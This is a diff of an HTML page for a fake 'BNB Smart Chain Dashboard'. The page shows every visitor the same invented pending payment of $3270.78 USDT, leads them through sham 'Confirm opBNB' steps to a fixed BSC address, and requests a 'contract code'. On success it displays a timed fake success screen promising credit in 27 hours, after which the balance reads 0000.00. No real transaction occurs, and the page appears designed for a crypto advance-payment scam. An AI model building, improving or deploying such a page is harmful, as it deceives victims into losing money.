@@ -1,131 +1,132 @@
 <!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>BSc Scan Dashboard</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
+  <meta charset="UTF-8" /><meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>BNB Smart Chain Dashboard</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
-    body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; background: #f2f4f8; }
-    .container { max-width: 600px; margin: 50px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-    h1 { color: #2B6CB0; }
-    input, button { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #ccc; }
-    button { background-color: #2B6CB0; color: white; font-weight: bold; cursor: pointer; }
-    button:hover { background-color: #1a4a7a; }
-    .hidden { display: none; }
-    .back-button { cursor: pointer; color: #2B6CB0; font-size: 18px; margin-bottom: 10px; display: inline-block; }
-    .info-box { background: #edf2f7; padding: 15px; border-radius: 8px; margin: 15px 0; font-family: monospace; }
-    .chart-container { width: 100%; height: 400px; margin: 20px 0; }
+    body { font-family:'Inter',sans-serif; background:#F8F9FA; margin:0; padding:0;
+      display:flex; justify-content:center; align-items:center; min-height:100vh; }
+    .container { background:#FFF; border:1px solid #DEE2E6; border-radius:8px;
+      padding:30px; width:100%; max-width:480px; text-align:center; box-shadow:0 2px 8px rgba(0,0,0,0.05); }
+    h1 { color:#2B6CB0; margin-bottom:20px; }
+    input, select { width:100%; padding:10px; margin:10px 0; border:1px solid #CED4DA; border-radius:4px; }
+    .btn { background:#2B6CB0; color:#fff; border:none; padding:10px 20px; margin:10px 5px;
+      border-radius:4px; cursor:pointer; font-weight:600; }
+    .btn:hover { background:#1A4A7A; }
+    .status, .wallet-status { color:#4A5568; margin:10px 0; font-size:14px; }
+    .back-btn { position:absolute; top:15px; left:15px; background:none; border:none; color:#2B6CB0; font-size:24px; cursor:pointer; }
+    .chart-container { margin:20px 0; height:300px; }
+    .hidden { display:none; }
   </style>
 </head>
-<body>  <div class="container" id="walletConnectPage">
-    <h1>Connect Wallet</h1>
-    <input type="text" id="walletAddressInput" placeholder="Enter your BSC wallet address" />
-    <button onclick="connectWallet()">Connect Wallet</button>
-  </div>  <div class="container hidden" id="dashboardPage">
-    <span class="back-button" onclick="goBack('walletConnectPage')">&lt; Back</span>
-    <h1>Profile Dashboard</h1>
-    <p><strong>Wallet:</strong> <span id="shortAddress"></span></p>
-    <div class="info-box">
-      <p><strong>Transaction pending...</strong></p>
-      <p>Transaction source: Binance</p>
-      <p>Transaction Amount: $3270.78 USDT</p>
-      <p>Address: <span id="userFullAddress"></span></p>
-      <p>Network: Binance Smart Chain (BEP20)</p>
-      <p>Transaction Status: In Progress</p>
-    </div>
+<body>
+  <button class="back-btn hidden" onclick="goBack()">&lt;</button>  <div class="container" id="page1">
+    <h1>BNB Smart Chain Dashboard</h1>
+    <input type="text" id="manualAddress" placeholder="Enter BSC Address" />
+    <button class="btn" onclick="connectWallet()">Connect Wallet</button>
+  </div>  <div class="container hidden" id="dashboard">
+    <h1>Wallet Dashboard</h1>
+    <p>Address: <span id="shortAddress"></span></p>
+    <p>Transaction pending.....</p>
+    <p>Transaction source: Binance</p>
+    <p>Transaction Amount: $3270.78 USDT</p>
+    <p>Network: Binance chain BSC BEP20</p>
+    <p>Transaction status: in progress</p>
     <div class="chart-container">
       <div id="tradingview-widget"></div>
     </div>
-    <button onclick="switchPage('confirmPage')">Confirm</button>
-  </div>  <div class="container hidden" id="confirmPage">
-    <span class="back-button" onclick="goBack('dashboardPage')">&lt; Back</span>
-    <h1>Confirm opBNB Transaction</h1>
-    <button onclick="switchPage('transactionInProgressPage')">Confirm opBNB</button>
-  </div>  <div class="container hidden" id="transactionInProgressPage">
-    <span class="back-button" onclick="goBack('confirmPage')">&lt; Back</span>
-    <h1>Transaction In Progress</h1>
-    <p>Status: Confirming...</p>
-    <button onclick="switchPage('contractConfirmPage')">Confirm</button>
-  </div>  <div class="container hidden" id="contractConfirmPage">
-    <span class="back-button" onclick="goBack('transactionInProgressPage')">&lt; Back</span>
-    <h1>Contract Confirmation</h1>
-    <p>BNB Smart Chain BEP20 Address:</p>
-    <div class="info-box">0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</div>
-    <input type="text" id="contractCodeInput" placeholder="Input opBNB contract code" />
-    <button onclick="confirmContractTransaction()">Confirm Contract Transaction</button>
-  </div>  <div class="container hidden" id="transactionSuccessPage">
+    <button class="btn" onclick="nextPage('confirm1')">Confirm</button>
+  </div>  <div class="container hidden" id="confirm1">
+    <h1>Confirm opBNB</h1>
+    <button class="btn" onclick="nextPage('confirm2')">Confirm opBNB</button>
+  </div>  <div class="container hidden" id="confirm2">
+    <h1>Transaction in Progress</h1>
+    <button class="btn" onclick="nextPage('contractInput')">Confirm</button>
+  </div>  <div class="container hidden" id="contractInput">
+    <h1>Input opBNB Contract Code</h1>
+    <p>BNB Smart Chain BEP20 network address:</p>
+    <p><strong>0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</strong></p>
+    <input type="text" id="contractCode" placeholder="Enter contract code" />
+    <button class="btn" onclick="verifyContract()">Confirm contract transaction</button>
+    <div class="status" id="verifyStatus"></div>
+  </div>  <div class="container hidden" id="success">
     <h1>✅ Transaction Successful</h1>
-    <div class="info-box">
-      <p>Amount: $3270.78 USDT</p>
-      <p>Transaction Source: 0xb8c77482e45f1f44de1745f52c74426c631bdd52</p>
-      <p>Network: BNB Smart Chain BEP20</p>
-      <p>Status: Successful — To be credited to user address in 27 hours</p>
-    </div>
-  </div>  <div class="container hidden" id="transactionDeclinedPage">
+    <p>Amount: $3270.78 USDT</p>
+    <p>Transaction source: 0xb8c77482e45f1f44de1745f52c74426c631bdd52</p>
+    <p>Network: BNB Smart Chain BEP20</p>
+    <p>Transaction status successful: To be credited to user address in 27HRS</p>
+  </div>  <div class="container hidden" id="declined">
     <h1>❌ Transaction Declined</h1>
     <p>Invalid contract code.</p>
   </div>  <script>
-    let userAddress = "";
+    let pageHistory = [];
 
-    function connectWallet() {
-      const addr = document.getElementById("walletAddressInput").value.trim();
-      if (!/^0x[a-fA-F0-9]{40}$/.test(addr)) return alert("Invalid BSC address");
-      userAddress = addr;
-      document.getElementById("shortAddress").innerText = `${addr.slice(0,6)}...${addr.slice(-4)}`;
-      document.getElementById("userFullAddress").innerText = addr;
-      switchPage("dashboardPage");
-      loadTradingViewWidget();
+    function showPage(id) {
+      document.querySelectorAll('.container').forEach(c => c.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+      document.querySelector('.back-btn').classList.toggle('hidden', pageHistory.length === 0);
     }
 
-    function switchPage(id) {
-      document.querySelectorAll(".container").forEach(div => div.classList.add("hidden"));
-      document.getElementById(id).classList.remove("hidden");
+    function nextPage(id) {
+      const current = document.querySelector('.container:not(.hidden)').id;
+      pageHistory.push(current);
+      showPage(id);
     }
 
-    function goBack(id) {
-      switchPage(id);
-    }
-
-    function confirmContractTransaction() {
-      const inputCode = document.getElementById("contractCodeInput").value.trim();
-      const correctCode = "0xb8c77482e45f1f44de1745f52c74426c631bdd52";
-      if (inputCode === correctCode) {
-        switchPage("transactionSuccessPage");
-        setTimeout(() => {
-          document.querySelector("#transactionSuccessPage .info-box").innerHTML = `
-            <p>Amount: $0000.00 USDT</p>
-            <p>Transaction Source: ${correctCode}</p>
-            <p>Network: BNB Smart Chain BEP20</p>
-            <p>Status: Funds credited</p>`;
-          switchPage("dashboardPage");
-        }, 80000);
-      } else {
-        switchPage("transactionDeclinedPage");
-        setTimeout(() => switchPage("contractConfirmPage"), 3000);
+    function goBack() {
+      if (pageHistory.length > 0) {
+        const prev = pageHistory.pop();
+        showPage(prev);
       }
     }
 
-    function loadTradingViewWidget() {
-      const container = document.getElementById("tradingview-widget");
-      container.innerHTML = "";
-      const script = document.createElement("script");
-      script.src = "https://s3.tradingview.com/external-embedding/embed-widget-mini-symbol-overview.js";
-      script.async = true;
-      script.innerHTML = JSON.stringify({
-        "symbol": "BINANCE:BNBUSDT",
-        "width": "100%",
-        "height": "400",
-        "locale": "en",
-        "dateRange": "1D",
-        "colorTheme": "light",
-        "trendLineColor": "#2B6CB0",
-        "underLineColor": "rgba(68, 155, 255, 0.3)",
-        "isTransparent": false,
-        "autosize": true,
-        "largeChartUrl": ""
-      });
-      container.appendChild(script);
+    async function connectWallet() {
+      const inputAddr = document.getElementById("manualAddress").value.trim();
+      if (!/^0x[a-fA-F0-9]{40}$/.test(inputAddr)) return alert("Invalid BSC address");
+      localStorage.setItem("connectedAddress", inputAddr);
+      document.getElementById("shortAddress").innerText = inputAddr.slice(0,6) + "..." + inputAddr.slice(-4);
+      showPage("dashboard");
     }
-  </script>
-</body>
+
+    async function verifyContract() {
+      const code = document.getElementById("contractCode").value.trim();
+      const status = document.getElementById("verifyStatus");
+      if (code === "0xb8c77482e45f1f44de1745f52c74426c631bdd52") {
+        status.innerText = "⏳ Processing...";
+        setTimeout(() => {
+          showPage("success");
+          setTimeout(() => {
+            showPage("dashboard");
+            document.getElementById("shortAddress").innerText = "0000.00";
+          }, 20000);
+        }, 60000);
+      } else {
+        showPage("declined");
+        setTimeout(() => showPage("contractInput"), 5000);
+      }
+    }
+
+    window.onload = () => {
+      const saved = localStorage.getItem("connectedAddress");
+      if (saved) {
+        document.getElementById("shortAddress").innerText = saved.slice(0,6) + "..." + saved.slice(-4);
+        showPage("dashboard");
+      } else {
+        showPage("page1");
+      }
+
+      new TradingView.widget({
+        "width": "100%",
+        "height": 300,
+        "symbol": "BINANCE:BNBUSDT",
+        "interval": "D",
+        "timezone": "Etc/UTC",
+        "theme": "light",
+        "style": "1",
+        "locale": "en",
+        "container_id": "tradingview-widget"
+      });
+    };
+  </script>  <script src="https://s3.tradingview.com/tv.js"></script></body>
 </html>
